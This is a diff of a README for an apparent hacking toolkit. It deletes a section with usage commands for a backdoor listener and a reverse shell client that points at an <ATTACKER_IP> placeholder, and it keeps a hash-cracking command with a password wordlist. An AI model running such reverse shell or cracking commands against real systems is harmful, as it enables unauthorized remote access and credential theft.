@@ -95,17 +95,6 @@ python crypto/hash_cracker.py <HASH> -w resources/wordlists/passwords.txt -m md5
 python web/file_downloader.py <URL> -o filename.ext
 ```
 
-### Reverse Shell (Backdoor)
-**Server (Attacker):**
-```bash
-python backdoors/listener.py -p 4444
-```
-
-**Client (Victim):**
-```bash
-python backdoors/reverse_shell.py --ip <ATTACKER_IP> --port 4444
-```
-
 ## 🤝 Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
 
